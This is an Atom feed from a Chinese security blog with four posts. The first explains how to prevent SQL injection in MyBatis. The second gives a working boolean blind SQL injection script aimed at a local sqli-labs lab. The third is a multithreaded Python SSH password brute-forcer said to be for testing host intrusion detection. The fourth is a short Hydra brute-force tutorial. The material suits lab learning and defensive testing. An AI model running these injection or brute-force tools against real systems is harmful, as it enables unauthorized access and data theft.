<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雪の迹</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-07T16:51:37.190Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mybatis防止sql注入</title>
    <link href="http://example.com/2021/09/08/mybatis%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/09/08/mybatis%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5/</id>
    <published>2021-09-07T16:28:07.000Z</published>
    <updated>2021-09-07T16:51:37.190Z</updated>
    
    <content type="html"><![CDATA[<p>Mybatis 的 Mapper.xml 语句中 parameterType 向SQL语句传参有两种方式：#{ } 和 ${ }。</p><h3 id="如何排查是否存在SQL注入？"><a href="#如何排查是否存在SQL注入？" class="headerlink" title="如何排查是否存在SQL注入？"></a>如何排查是否存在SQL注入？</h3><h4 id="1-检查是否有-号"><a href="#1-检查是否有-号" class="headerlink" title="1. 检查是否有$号"></a>1. 检查是否有$号</h4><p>如果你使用的是ide代码编辑器，那么可以通过全局搜索<code>$&#123;</code> , 快速定位到使用${ }拼接SQL的语句，在去找到外部传入参数的入口，闭合sql证明即可。</p><h4 id="2-检查是否有order-by语句"><a href="#2-检查是否有order-by语句" class="headerlink" title="2. 检查是否有order by语句"></a>2. 检查是否有order by语句</h4><p>同样的在搜索是否使用<code>order by</code>排序语句，如果有一步一步追踪是否有外部参数，未过滤就直接传递到order by语句里面来。</p><h3 id="为什么-不会存在SQL注入？"><a href="#为什么-不会存在SQL注入？" class="headerlink" title="为什么#{}不会存在SQL注入？"></a>为什么<code>#&#123;&#125;</code>不会存在SQL注入？</h3><p>#{ } 就类似JDBC的预编译，所以安全。</p><p>MyBatis是如何做到SQL预编译的呢？其实在框架底层，是JDBC中的PreparedStatement类在起作用，PreparedStatement是我们很熟悉的Statement的子类，它的对象包含了编译好的SQL语句。这种“准备好”的方式不仅能提高安全性，而且在多次执行同一个SQL时，能够提高效率。原因是SQL已编译好，再次执行时无需再编译。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全的，预编译了的</span></span><br><span class="line">Connection conn = getConn();<span class="comment">//获得连接</span></span><br><span class="line">String sql = <span class="string">&quot;select id, username, password, role from user where id=?&quot;</span>; <span class="comment">//执行sql前会预编译号该条语句</span></span><br><span class="line">PreparedStatement pstmt = conn.prepareStatement(sql); </span><br><span class="line"><span class="comment">//look out！！！</span></span><br><span class="line">pstmt.setString(<span class="number">1</span>, id); </span><br><span class="line">ResultSet rs=pstmt.executeUpdate(); </span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>与此对应的，没有进行预编译的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不安全的，没进行预编译</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getNameByUserId</span><span class="params">(String userId)</span> </span>&#123;</span><br><span class="line">    Connection conn = getConn();<span class="comment">//获得连接</span></span><br><span class="line">    String sql = <span class="string">&quot;select id,username,password,role from user where id=&quot;</span> + id;</span><br><span class="line">    <span class="comment">//当id参数为&quot;3;drop table user;&quot;时，执行的sql语句如下:</span></span><br><span class="line">    <span class="comment">//select id,username,password,role from user where id=3; drop table user;  </span></span><br><span class="line">    PreparedStatement pstmt =  conn.prepareStatement(sql);</span><br><span class="line">    ResultSet rs=pstmt.executeUpdate();</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="什么情况下用不了"><a href="#什么情况下用不了" class="headerlink" title="什么情况下用不了#{}"></a>什么情况下用不了<code>#&#123;&#125;</code></h2><p>答案是：在order by 排序语句的情况下不行，为什么？</p><p>对于order by 我们是用不了#{}的，因为用了这个就会被自动转换成字符串，自动加引号，这样order by语句就不生效了。</p><p>例子：<em>（注：有些加了引号也生效的，注意原来没有order by时候是怎么排序的！）</em></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> id       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> xiaomi10 <span class="operator">|</span>   <span class="number">678910</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> casss    <span class="operator">|</span> <span class="number">20200711</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> kkk      <span class="operator">|</span>    <span class="number">23432</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ddd      <span class="operator">|</span>       <span class="number">44</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> name;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> id       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> casss    <span class="operator">|</span> <span class="number">20200711</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ddd      <span class="operator">|</span>       <span class="number">44</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> kkk      <span class="operator">|</span>    <span class="number">23432</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xiaomi10 <span class="operator">|</span>   <span class="number">678910</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">order</span> <span class="keyword">by</span> &quot;name&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> id       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="operator">|</span> xiaomi10 <span class="operator">|</span>   <span class="number">678910</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> casss    <span class="operator">|</span> <span class="number">20200711</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> kkk      <span class="operator">|</span>    <span class="number">23432</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ddd      <span class="operator">|</span>       <span class="number">44</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h2 id="如何处理order-by的情况？"><a href="#如何处理order-by的情况？" class="headerlink" title="如何处理order by的情况？"></a>如何处理order by的情况？</h2><p>使用了 ${}后，使用者需要自行过滤输入，方法有：</p><p>1、代码层使用白名单的方式，限制 sortBy 允许的值，如只能为 name, email 字段，异常情况则设置为默认值 name。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;getUserListSortBy&quot;</span> resultType=<span class="string">&quot;org.example.User&quot;</span>&gt;</span><br><span class="line">    SELECT * FROM user  </span><br><span class="line">    &lt;<span class="keyword">if</span> test=<span class="string">&quot;sortBy == &#x27;name&#x27; or sortBy == &#x27;email&#x27;&quot;</span>&gt;</span><br><span class="line">        order by $&#123;sortBy&#125;  </span><br><span class="line">    &lt;/<span class="keyword">if</span>&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>2、使用正则过滤特殊字符，因为就是DB表的字段的规则，只能是：<strong>英文</strong>，<strong>数字</strong>，<strong>下划线</strong>。</p><h2 id="更多场景"><a href="#更多场景" class="headerlink" title="更多场景"></a>更多场景</h2><h3 id="1、like-语句"><a href="#1、like-语句" class="headerlink" title="1、like 语句"></a>1、like 语句</h3><p>like不能直接用#，可以先用concat加上%包裹再用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where tile like concat(‘%’,#&#123;title&#125;, ‘%’)</span><br></pre></td></tr></table></figure><h3 id="2、In语句"><a href="#2、In语句" class="headerlink" title="2、In语句"></a>2、In语句</h3><p>in之后多个参数也不能直接用#，可以foreach遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id in</span><br><span class="line">&lt;foreach collection=&quot;ids&quot; item=&quot;item&quot; open=&quot;(&quot;separator=&quot;,&quot; close=&quot;)&quot;&gt;#&#123;item&#125; &lt;/foreach&gt;</span><br></pre></td></tr></table></figure><p>参考文章：</p><ul><li><a href="https://www.cnblogs.com/mysticbinary/p/12613243.html">https://www.cnblogs.com/mysticbinary/p/12613243.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/39408398">https://zhuanlan.zhihu.com/p/39408398</a></li><li><a href="https://chenguoji.com/2019/07/26/che-di-gan-diao-e-xin-de-sql-zhu-ru-lou-dong-yi-wang-da-jin/">https://chenguoji.com/2019/07/26/che-di-gan-diao-e-xin-de-sql-zhu-ru-lou-dong-yi-wang-da-jin/</a></li><li><a href="https://springboot.io/t/topic/905">https://springboot.io/t/topic/905</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Mybatis 的 Mapper.xml 语句中 parameterType 向SQL语句传参有两种方式：#{ } 和 ${ }。&lt;/p&gt;
&lt;h3 id=&quot;如何排查是否存在SQL注入？&quot;&gt;&lt;a href=&quot;#如何排查是否存在SQL注入？&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="security" scheme="http://example.com/categories/security/"/>
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之布尔盲注</title>
    <link href="http://example.com/2021/08/06/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2021/08/06/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-08-06T15:10:33.000Z</published>
    <updated>2021-08-06T15:14:25.301Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境</p><p>1.运行：</p><p><code>docker info</code><br>2.搜索sqli-labs：</p><p><code>docker search sqli-labs</code><br>3.建立镜像：</p><p><code>docker pull acgpiano/sqli-labs</code><br>4.查看存在的镜像：</p><p><code>docker images</code><br>5.运行存在的镜像：<br><code>docker run -dt --name sqli-labs -p 8081:80 --rm acgpiano/sqli-labs</code></p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>记录sqli-labs中的布尔盲注脚本，不定期更新中…</p><h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><p>什么叫盲注，是指在sql执行过程中，执行结果不回显到前端（不明显），这个时只能尝试盲注。盲注又可以分为以下2种：</p><ol><li>基于布尔盲注</li><li>基于时间的盲注</li></ol><p>盲注经常会用到以下SQL函数：</p><ol><li>length(str) ：返回字符串str的长度</li><li>substr/substring(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回，pos从1开始</li><li>mid(str,pos,len) ：跟上面的一样，截取字符串</li><li>ascii(str) ：返回字符串str的最左面字符的ASCII代码值</li><li>ord(str) ：将字符或布尔类型转成ascll码</li><li>if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</li></ol><h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol><li>先判断盲注是否存在，例如<code>&#39; and &#39;a&#39;=&#39;a</code> 等。</li><li>代码通过<code>length(payload)</code>判断payload获取结果的长度。</li><li>依据步骤2获取的长度，根据<code>substr(str, pos, len)</code>采用2层迭代遍历。</li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>二分法？</p><h2 id="三、例子"><a href="#三、例子" class="headerlink" title="三、例子"></a>三、例子</h2><h3 id="sqli-labs-Less-1"><a href="#sqli-labs-Less-1" class="headerlink" title="sqli-labs Less-1"></a><em>sqli-labs Less-1</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> * @Author whale4u</span></span><br><span class="line"><span class="string"> * @Date 2021/5/6</span></span><br><span class="line"><span class="string"> * @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举</span></span><br><span class="line">chr_str = string.ascii_lowercase + string.punctuation + string.digits</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">payload_t = <span class="string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;</span></span><br><span class="line">payload_c = <span class="string">&quot;(select group_concat(column_name) from information_schema.columns where table_schema=database())&quot;</span></span><br><span class="line"><span class="comment"># 获取长度payload</span></span><br><span class="line"><span class="comment"># 字符型</span></span><br><span class="line">payload_len = <span class="string">&quot;&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+&quot;</span></span><br><span class="line"><span class="comment"># 数值型</span></span><br><span class="line"><span class="comment"># payload_len = &quot;&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+&quot;</span></span><br><span class="line"><span class="comment"># 获取表名payload，注意这里后面字符要用单引号括起来！否则总为真。</span></span><br><span class="line">payload_name = <span class="string">&quot;&#x27; and substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27; --+&quot;</span></span><br><span class="line"><span class="comment"># url</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8081/Less-1/?id=1&quot;</span></span><br><span class="line"><span class="comment"># mark</span></span><br><span class="line">mark = <span class="string">&quot;Dumb&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQLInjector</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, mark, payload</span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.mark = mark</span><br><span class="line">        self.payload = payload</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_length</span>(<span class="params">self</span>):</span>  <span class="comment"># 先要获取payload长度才能遍历</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># http://127.0.0.1:8081/Less-1/?id=1&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+</span></span><br><span class="line">            full_url = (self.url + payload_len).<span class="built_in">format</span>(self.payload, i)</span><br><span class="line">            req = requests.get(full_url)</span><br><span class="line">            <span class="keyword">if</span> self.mark <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;len: &quot;</span>, i)</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">                <span class="comment"># break</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        length = self.get_length()</span><br><span class="line">        output = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 从第1位开始遍历</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> chr_str:</span><br><span class="line">                <span class="comment"># http://127.0.0.1:8081/Less-1/?id=1&#x27; and substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27; --+</span></span><br><span class="line">                full_url = (self.url + payload_name).<span class="built_in">format</span>(self.payload, i, j)</span><br><span class="line">                req = requests.get(full_url)</span><br><span class="line">                <span class="keyword">if</span> self.mark <span class="keyword">in</span> req.text:</span><br><span class="line">                    output = output + j</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;col/tab: &quot;</span>, output)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># print(chr_str)</span></span><br><span class="line">    sqli = SQLInjector(url, mark, payload_c)</span><br><span class="line">    <span class="comment"># sqli.get_length()</span></span><br><span class="line">    sqli.get_name()</span><br></pre></td></tr></table></figure><p>运行截图：</p><p><img src="https://wha1e4u.oss-cn-shenzhen.aliyuncs.com/image-20210506195300400.png" class="lazyload" data-srcset="https://wha1e4u.oss-cn-shenzhen.aliyuncs.com/image-20210506195300400.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210506195300400"></p><p>参考文章：</p><ol><li><a href="http://miracle778.site/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8.html">SQL注入之布尔盲注</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;实验环境&lt;/p&gt;
&lt;p&gt;1.运行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker info&lt;/code&gt;&lt;br&gt;2.搜索sqli-labs：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker search sqli-labs&lt;/code&gt;&lt;br&gt;3.建立镜像：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;d</summary>
      
    
    
    
    <category term="security" scheme="http://example.com/categories/security/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python实现SSH爆破</title>
    <link href="http://example.com/2021/08/05/Python%E5%AE%9E%E7%8E%B0SSH%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2021/08/05/Python%E5%AE%9E%E7%8E%B0SSH%E7%88%86%E7%A0%B4/</id>
    <published>2021-08-05T07:47:51.000Z</published>
    <updated>2021-08-06T15:17:03.641Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前言</strong></p><p>Python实现SSH爆破，用来测试hids检测效果。</p><p><strong>准备工作</strong></p><p>安装paramiko：<code>pip install paramiko</code></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> paramiko, sys, os, socket, threading, time </span><br><span class="line"><span class="keyword">import</span> itertools,string,crypt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码最大长度</span></span><br><span class="line">PASS_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce_list</span>(<span class="params">charset, maxlength</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>.join(candidate)</span><br><span class="line">        <span class="keyword">for</span> candidate <span class="keyword">in</span> itertools.chain.from_iterable(itertools.product(charset, repeat=i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlength + <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attempt</span>(<span class="params">Password</span>):</span></span><br><span class="line"><span class="comment"># 攻击IP、用户、端口</span></span><br><span class="line">    IP = <span class="string">&quot;10.127.127.61&quot;</span></span><br><span class="line">    USER = <span class="string">&quot;root&quot;</span></span><br><span class="line">    PORT=<span class="number">22</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh.load_system_host_keys()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ssh.connect(IP , port=PORT, username=USER, password=Password)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Connected successfully. Password = &quot;</span>+Password</span><br><span class="line">        <span class="keyword">except</span> paramiko.AuthenticationException, error:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Incorrect password: &quot;</span>+Password</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> socket.error, error:</span><br><span class="line">            <span class="built_in">print</span> error</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> paramiko.SSHException, error:</span><br><span class="line">            <span class="built_in">print</span> error</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Most probably this is caused by a missing host key&quot;</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception, error:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Unknown error: &quot;</span>+error</span><br><span class="line">            <span class="keyword">pass</span>    </span><br><span class="line">        ssh.close()</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">except</span> Exception,error :</span><br><span class="line">        <span class="built_in">print</span> error</span><br><span class="line"></span><br><span class="line">letters_list = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&amp;()&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bruteforce_list(letters_list, PASS_SIZE):</span><br><span class="line">    t = threading.Thread(target=attempt, args=(i,))</span><br><span class="line">    t.start()</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>效果</strong></p><blockquote><p>[root@localhost ~]# python ssh_bruteforcer.py<br>/usr/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br>  from cryptography.hazmat.backends import default_backend<br>Incorrect password: a<br>Incorrect password: b<br>Incorrect password: c<br>Incorrect password: d<br>Incorrect password: e</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Python实现SSH爆破，用来测试hids检测效果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;准备工作&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装paramiko：&lt;code&gt;pip install paramiko&lt;/code&gt;&lt;/</summary>
      
    
    
    
    <category term="security" scheme="http://example.com/categories/security/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="ssh" scheme="http://example.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Hydra简明教程</title>
    <link href="http://example.com/2021/08/05/Hydra%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"/>
    <id>http://example.com/2021/08/05/Hydra%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/</id>
    <published>2021-08-05T02:45:00.000Z</published>
    <updated>2021-08-05T02:50:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>centos安装教程：<a href="https://www.cnblogs.com/ellisonzhang/p/13440614.html">Centos7安装Hydra(爆破神器)</a></p><p>macos安装：<code>brew install hydra</code></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="SSH爆破"><a href="#SSH爆破" class="headerlink" title="SSH爆破"></a>SSH爆破</h3><ul><li>使用密码文件</li></ul><p><code>hydra -l root -P top100_ssh_vps.txt 10.127.127.79 ssh</code></p><ul><li>使用用户名、密码文件</li></ul><h3 id="RDP爆破"><a href="#RDP爆破" class="headerlink" title="RDP爆破"></a>RDP爆破</h3><ul><li><p>使用密码文件</p></li><li><p>使用用户名、密码文件</p></li></ul><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li>密码字典：<a href="https://github.com/k8gege/PasswordDic">PasswordDic</a></li></ul>]]></content>
    
    
      
      
